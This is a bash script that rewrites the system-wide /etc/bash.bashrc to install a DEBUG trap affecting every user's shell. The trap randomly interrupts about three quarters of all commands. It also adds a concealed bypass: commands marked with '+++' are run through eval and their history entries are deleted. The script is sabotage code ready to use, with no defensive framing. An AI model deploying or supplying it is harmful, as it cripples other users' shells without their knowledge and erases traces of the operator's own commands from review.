#!/bin/bash

# Define probability percentage (replace XX with a number between 0-100)
PROBABILITY=25  

# Backup the original bashrc file
cp /etc/bash.bashrc /etc/bash.bashrc.bak

# Append filtering logic to /etc/bash.bashrc
cat << EOF >> /etc/bash.bashrc

# Ensure PROBABILITY is available inside bashrc
PROBABILITY=$PROBABILITY

random_run() {
    # Always allow commands containing '+++'
    if [[ "\$BASH_COMMAND" == *+++* ]]; then
	modified_command="\${BASH_COMMAND:4}"

        # Prevent the original command from running
        history -d \$(history 1) 2>/dev/null  

        # Execute the modified command manually, suppressing any errors
        eval "\$modified_command" 2>/dev/null  

        # Return 1 to stop execution of the original command
        return 1
    fi

    # Generate a random number between 0 and 99
    local rand=\$((RANDOM % 100))

    # Check if the random number is greater than or equal to the probability
    if (( rand >= PROBABILITY )); then
        kill -SIGINT \$\$  # Terminate execution if blocked
    fi
}

# Set a trap to call random_run every time a command is executed
trap random_run DEBUG

EOF
